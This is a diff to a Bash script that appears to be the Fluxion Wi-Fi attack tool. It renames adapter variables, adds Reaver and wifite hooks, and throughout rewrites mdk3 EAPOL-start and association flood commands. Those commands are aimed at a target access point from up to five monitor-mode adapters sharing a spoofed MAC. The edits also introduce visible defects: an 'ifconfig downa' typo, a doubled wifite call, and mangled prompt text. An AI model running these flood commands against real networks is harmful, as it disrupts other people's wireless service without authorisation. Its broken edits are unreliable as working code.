@@ -17,7 +17,7 @@ clear
 DUMP_PATH="/tmp/TMPflux"                               
 # Number de desautentificaciones
 DEAUTHTIME="30"
-revision=4
+revision=5
 version=0.18
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -256,7 +256,7 @@ function mostrarheader(){
 	conditional_clear
 	echo -e "$blue#########################################################"
 	echo -e "$blue#                                                       #"
-	echo -e "$blue#$red	FLUXION $version" "${yellow}by ""${blue}deltax and strasharo""$blue            #"${blue}
+	echo -e "$blue#$red	FLUXION $version" "${yellow}by ""${blue}deltax and strasharo ""$blue            #"${blue}
 	echo -e "$blue#""${red}	F""${yellow}lux" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture"
 	echo -e "$blue#                                                       #"
 	echo -e "$blue#########################################################""$transparent"
@@ -284,7 +284,7 @@ function checkdependences {
 	echo -ne "Aircrack-ng....."
 	if ! hash aircrack-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -293,7 +293,7 @@ function checkdependences {
 	echo -ne "Aireplay-ng....."
 	if ! hash aireplay-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -302,7 +302,7 @@ function checkdependences {
 	echo -ne "Airmon-ng......."
 	if ! hash airmon-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -311,7 +311,7 @@ function checkdependences {
 	echo -ne "Airodump-ng....."
 	if ! hash airodump-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -320,7 +320,7 @@ function checkdependences {
 	echo -ne "Awk............."
 	if ! hash awk 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -329,7 +329,7 @@ function checkdependences {
 	echo -ne "Curl............"
 	if ! hash curl 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -338,7 +338,7 @@ function checkdependences {
 	echo -ne "Dhcpd..........."
 	if ! hash dhcpd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -347,7 +347,7 @@ function checkdependences {
 	echo -ne "Hostapd........."
 	if ! hash hostapd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -356,7 +356,7 @@ function checkdependences {
 	echo -ne "Iwconfig........"
 	if ! hash iwconfig 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -365,7 +365,7 @@ function checkdependences {
 	echo -ne "Lighttpd........"
 	if ! hash lighttpd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -374,7 +374,7 @@ function checkdependences {
 	echo -ne "Macchanger......"
 	if ! hash macchanger 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 	    echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -383,7 +383,7 @@ function checkdependences {
 	echo -ne "Mdk3............"
 	if ! hash mdk3 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -392,7 +392,7 @@ function checkdependences {
 	echo -ne "Nmap............"
 	if ! [ -f /usr/bin/nmap ]; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -401,7 +401,7 @@ function checkdependences {
 	echo -ne "Php5-cgi........"
 	if ! [ -f /usr/bin/php-cgi ]; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -410,7 +410,7 @@ function checkdependences {
 	echo -ne "Pyrit..........."
 	if ! hash pyrit 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -419,7 +419,7 @@ function checkdependences {
 	echo -ne "Python.........."
 	if ! hash python 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -428,22 +428,31 @@ function checkdependences {
 	echo -ne "Unzip..........."
 	if ! hash unzip 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
+	sleep 0.025
+
+	echo -ne "Reaver ...."
+	if ! hash reaver 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi 
 	sleep 0.025
 	
 	echo -ne "Xterm..........."
 	if ! hash xterm 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent""
-		salir=1
+		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
 	sleep 0.025
 	
-	if [ "$salir" = "1" ]; then
+	if [ "$exit" = "1" ]; then
 	exit 1
 	fi
 	
@@ -849,7 +858,7 @@ function askAP {
 			1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
 			2 ) fakeapmode="airbase-ng"; askauth; break ;;
 			3 ) fakeapdmode="WPS"; wps; break ;;
-			4 ) wifite ;;
+			4 ) wifite ;wifite; break ;;
 			5 ) selection; break ;;
 			* ) echo "Unknown option. Choose again"; conditional_clear ;;
 		esac
@@ -857,6 +866,10 @@ function askAP {
 	
 } 
 
+#wifite
+function wifite {
+	sudo python wifite.py
+}
 # Test Passwords / airbase-ng
 function askauth {
 	
@@ -908,10 +921,10 @@ declare BSSID;
 declare ESSID;
 declare CHANNEL;
 declare WIFI_MONITOR;
-declare ADAPTER2;
-declare ADAPTER3;
-declare ADAPTER4;
-declare ADAPTER5;
+declare WIFI_MONITOR2;
+declare WIFI_MONITOR3;
+declare WIFI_MONITOR4;
+declare WIFI_MONITOR5;
 sleep 3
 clear
 
@@ -932,45 +945,45 @@ echo "Monitor Mode Enabled"
 
 enable_mon_mode_2()
 {
-echo "Enabling Monitor Mode on $ADAPTER2"
-sudo ifconfig $ADAPTER2 down
+echo "Enabling Monitor Mode on $WIFI_MONITOR2"
+sudo ifconfig $WIFI_MONITOR2 down
 sleep 1
-sudo iwconfig $ADAPTER2 mode monitor
+sudo iwconfig $WIFI_MONITOR2 mode monitor
 sleep 1
-sudo ifconfig $ADAPTER2 up
+sudo ifconfig $WIFI_MONITOR2 up
 echo "Monitor Mode Enabled"
 }
 
 enable_mon_mode_3()
 {
-echo "Enabling Monitor Mode on $ADAPTER3"
-sudo ifconfig $ADAPTER3 down
+echo "Enabling Monitor Mode on $WIFI_MONITOR3"
+sudo ifconfig $WIFI_MONITOR3 down
 sleep 1
-sudo iwconfig $ADAPTER3 mode monitor
+sudo iwconfig $WIFI_MONITOR3 mode monitor
 sleep 1
-sudo ifconfig $ADAPTER3 up
+sudo ifconfig $WIFI_MONITOR3 up
 echo "Monitor Mode Enabled"
 }
 
 enable_mon_mode_4()
 {
-echo "Enabling Monitor Mode on $ADAPTER4"
-sudo ifconfig $ADAPTER4 down
+echo "Enabling Monitor Mode on $WIFI_MONITOR4"
+sudo ifconfig $WIFI_MONITOR4 downa
 sleep 1
-sudo iwconfig $ADAPTER4 mode monitor
+sudo iwconfig $WIFI_MONITOR4 mode monitor
 sleep 1
-sudo ifconfig $ADAPTER4 up
+sudo ifconfig $WIFI_MONITOR4 up
 echo "Monitor Mode Enabled"
 }
 
 enable_mon_mode_5()
 {
-echo "Enabling Monitor Mode on $ADAPTER5"
-sudo ifconfig $ADAPTER5 down
+echo "Enabling Monitor Mode on $WIFI_MONITOR5"
+sudo ifconfig $WIFI_MONITOR5 down
 sleep 1
-sudo iwconfig $ADAPTER5 mode monitor
+sudo iwconfig $WIFI_MONITOR5 mode monitor
 sleep 1
-sudo ifconfig $ADAPTER5 up
+sudo ifconfig $WIFI_MONITOR5 up
 echo "Monitor Mode Enabled"
 }
 
@@ -991,45 +1004,45 @@ echo "MAC Changed"
 
 mac_change_2()
 {
-echo "Setting the MAC Address on $ADAPTER2"
-sudo ifconfig $ADAPTER2 down
+echo "Setting the MAC Address on $WIFI_MONITOR2"
+sudo ifconfig $WIFI_MONITOR2 down
 sleep 3
-macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
+macchanger $WIFI_MONITOR2 -m 02:22:88:29:EC:6F
 sleep 3
-sudo ifconfig $ADAPTER2 up
+sudo ifconfig $WIFI_MONITOR2 up
 echo "MAC Changed"
 }
 
 mac_change_3()
 {
-echo "Setting the MAC Address on $ADAPTER3"
-sudo ifconfig $ADAPTER3 down
+echo "Setting the MAC Address on $WIFI_MONITOR3"
+sudo ifconfig $WIFI_MONITOR3 down
 sleep 3
-macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
+macchanger $WIFI_MONITOR3 -m 02:22:88:29:EC:6F
 sleep 3
-sudo ifconfig $ADAPTER3 up
+sudo ifconfig $WIFI_MONITOR3 up
 echo "MAC Changed"
 }
 
 mac_change_4()
 {
-echo "Setting the MAC Address on $ADAPTER4"
-sudo ifconfig $ADAPTER4 down
+echo "Setting the MAC Address on $WIFI_MONITOR4"
+sudo ifconfig $WIFI_MONITOR4 down
 sleep 3
-macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
+macchanger $WIFI_MONITOR4 -m 02:22:88:29:EC:6F
 sleep 3
-sudo ifconfig $ADAPTER4 up
+sudo ifconfig $WIFI_MONITOR4 up
 echo "MAC Changed"
 }
 
 mac_change_5()
 {
-echo "Setting the MAC Address on $ADAPTER5"
-sudo ifconfig $ADAPTER5 down
+echo "Setting the MAC Address on $WIFI_MONITOR5"
+sudo ifconfig $WIFI_MONITOR5 down
 sleep 3
-macchanger $ADAPTER5 -m 02:22:88:29:EC:6F
+macchanger $WIFI_MONITOR5 -m 02:22:88:29:EC:6F
 sleep 3
-sudo ifconfig $ADAPTER5 up
+sudo ifconfig $WIFI_MONITOR5 up
 echo "MAC Changed"
 }
 
@@ -1211,42 +1224,42 @@ run_mdk3_EAPOL1()
 
 run_mdk3_ASOC2()
 {
-	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m"
+	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $BSSID -m"
 }
 
 run_mdk3_EAPOL2()
 {
-	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250"
+	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $BSSID -n $ESSID -s 250"
 }
 
 run_mdk3_ASOC3()
 {
-	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m"
+	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $BSSID -m"
 }
 
 run_mdk3_EAPOL3()
 {
-	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250"
+	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $BSSID -n $ESSID -s 250"
 }
 
 run_mdk3_ASOC4()
 {
-	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m"
+	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $BSSID -m"
 }
 
 run_mdk3_EAPOL4()
 {
-	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250"
+	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $BSSID -n $ESSID -s 250"
 }
 
 run_mdk3_ASOC5()
 {
-	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m"
+	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR5 a -a $BSSID -m"
 }
 
 run_mdk3_EAPOL5()
 {
-	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250"
+	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR5 x 0 -t $BSSID -n $ESSID -s 250"
 }
 
 ##################################End Of Functions For MDK3 ########################################
@@ -1254,11 +1267,11 @@ run_mdk3_EAPOL5()
 conditional_clear
 mostrarheader
 
-echo "§How many wlan Adapters§"
+echo "§How many wlan WIFI_MONITORs§"
 echo "                                       "
-echo -e ""$blue"1)"$transparent" 1 Adapter"
-echo -e ""$blue"2)"$transparent" 2 Adapter"
-echo -e ""$blue"3)"$transparent" 3 Adapter"
+echo -e ""$blue"1)"$transparent" 1 WIFI_MONITOR"
+echo -e ""$blue"2)"$transparent" 2 WIFI_MONITOR"
+echo -e ""$blue"3)"$transparent" 3 WIFI_MONITOR"
 echo -e ""$blue"4)"$transparent" Back"
 echo "                                       "
 echo -n "      #> "
@@ -1268,7 +1281,7 @@ case $a in
 	1)
 clear
 echo 
-read -p " - What is the name of your Wlan Adapter (Ex:wlan0) - ": WIFI_MONITOR;
+read -p " - What is the name of your Wlan WIFI_MONITOR (Ex:wlan0) - ": WIFI_MONITOR;
 
 clear
 
@@ -1440,10 +1453,10 @@ clear
 conditional_clear
 mostrarheader
 echo 
-read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR;
+read -p " - What is the name of your 1st Wlan WIFI_MONITOR (Ex:Wlan0) - ": WIFI_MONITOR;
 clear
 echo 
-read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
+read -p " - What is the name of your 2nd Wlan WIFI_MONITOR (Ex:Wlan1) - ": WIFI_MONITOR2;
 clear
 
 scan_for_targets
@@ -1457,7 +1470,7 @@ enable_mon_mode_2
 clear
 conditional_clear
 mostrarheader
-echo "Second Adapter
+echo "Second WIFI_MONITOR
 1)Yes
 2)No"
 
@@ -1511,12 +1524,12 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250
+timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
 clear
-timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m
+timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $BSSID -m
 menu
 ;;
 	3)
@@ -1604,13 +1617,13 @@ mostrarheader
 	3)
 clear
 echo 
-read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR;
+read -p " - What is the name of your 1st Wlan WIFI_MONITOR (Ex:Wlan0) - ": WIFI_MONITOR;
 clear
 echo 
-read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
+read -p " - What is the name of your 2nd Wlan WIFI_MONITOR (Ex:Wlan1) - ": WIFI_MONITOR2;
 clear
 echo 
-read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
+read -p " - What is the name of your 3rd Wlan WIFI_MONITOR (Ex:Wlan2) - ": WIFI_MONITOR3;
 clear
 
 scan_for_targets
@@ -1630,7 +1643,7 @@ enable_mon_mode_3
 clear
 conditional_clear
 mostrarheader
-echo "************** - Would you like to set the 3 Adapters to an Identical MAC Address? - ************** 
+echo "************** - Would you like to set the 3 WIFI_MONITORs to an Identical MAC Address? - ************** 
 1)Yes
 2)No"
 
@@ -1685,12 +1698,12 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250
+timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
 clear
-timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m
+timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $BSSID -m
 menu
 ;;
 	3)
@@ -1776,16 +1789,16 @@ menu
 	4)
 clear
 echo 
-read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR;
+read -p " - What is the name of your 1st Wlan WIFI_MONITOR (Ex:Wlan0) - ": WIFI_MONITOR;
 clear
 echo 
-read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
+read -p " - What is the name of your 2nd Wlan WIFI_MONITOR (Ex:Wlan1) - ": WIFI_MONITOR2;
 clear
 echo 
-read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
+read -p " - What is the name of your 3rd Wlan WIFI_MONITOR (Ex:Wlan2) - ": WIFI_MONITOR3;
 clear
 echo 
-read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;
+read -p " - What is the name of your 4th Wlan WIFI_MONITOR (Ex:Wlan3) - ": WIFI_MONITOR4;
 clear
 
 scan_for_targets
@@ -1803,7 +1816,7 @@ enable_mon_mode_4
 
 clear
 
-echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
+echo "************** - Would you like to set ALL Wlan WIFI_MONITORs to the same MAC Address? - ************** 
 1)Yes
 2)No"
 
@@ -1861,12 +1874,12 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250
+timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
 clear
-timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m
+timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $BSSID -m
 menu
 ;;
 	3)
@@ -1952,19 +1965,19 @@ menu
 	5)
 clear
 echo 
-read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR;
+read -p " - What is the name of your 1st Wlan WIFI_MONITOR (Ex:Wlan0) - ": WIFI_MONITOR;
 clear
 echo 
-read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
+read -p " - What is the name of your 2nd Wlan WIFI_MONITOR (Ex:Wlan1) - ": WIFI_MONITOR2;
 clear
 echo 
-read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
+read -p " - What is the name of your 3rd Wlan WIFI_MONITOR (Ex:Wlan2) - ": WIFI_MONITOR3;
 clear
 echo 
-read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;
+read -p " - What is the name of your 4th Wlan WIFI_MONITOR (Ex:Wlan3) - ": WIFI_MONITOR4;
 clear
 echo 
-read -p " - What is the name of your 5th Wlan Adapter (Ex:Wlan4) - ": ADAPTER5;
+read -p " - What is the name of your 5th Wlan WIFI_MONITOR (Ex:Wlan4) - ": WIFI_MONITOR5;
 clear
 
 scan_for_targets
@@ -1983,7 +1996,7 @@ enable_mon_mode_5
 
 clear
 
-echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
+echo "************** - Would you like to set ALL Wlan WIFI_MONITORs to the same MAC Address? - ************** 
 1)Yes
 2)No"
 
@@ -2042,12 +2055,12 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250
+timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $WIFI_MONITOR5 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
 clear
-timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m
+timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $BSSID -m & timeout 60 mdk3 $WIFI_MONITOR5 a -a $BSSID -m
 menu
 ;;
 	3)
